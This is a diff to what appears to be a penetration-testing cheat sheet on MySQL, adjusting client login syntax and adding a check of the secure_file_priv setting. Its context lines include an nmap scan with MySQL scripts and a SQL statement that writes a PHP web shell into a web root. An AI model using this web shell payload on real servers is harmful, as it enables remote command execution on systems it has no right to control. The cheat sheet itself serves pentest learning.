@@ -33,13 +33,11 @@ sudo nmap -sV -sC -p3306 --script mysql* <IP>
 {% code lineNumbers="true" %}
 ```shellscript
 ## Linux
-mysql -u <username> -p <password> -h <IP>
+mysql -u <username> -p<password> -h <IP> ## no space for password field
 ## Windows
-mysql.exe -u <username> -p <password> -h <IP>
+mysql.exe -u <username> -p<password> -h <IP>
 Commands
 show databases;, use <database>;, show tables;, show columns from <table>;, select * from <table>;, select * from <table> where <column> = "<string>";
-
-
 ```
 {% endcode %}
 {% endtab %}
@@ -53,6 +51,7 @@ show databases;, use <database>;, show tables;, show columns from <table>;, sele
 
 * #### Write Local Files <a href="#write-local-files" id="write-local-files"></a>
   * <pre class="language-sql" data-line-numbers><code class="lang-sql">-- When 'secure_file_priv' is not set
+    show variables like "secure_file_priv";
     SELECT "&#x3C;?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
     </code></pre>
 * #### Read Local Files
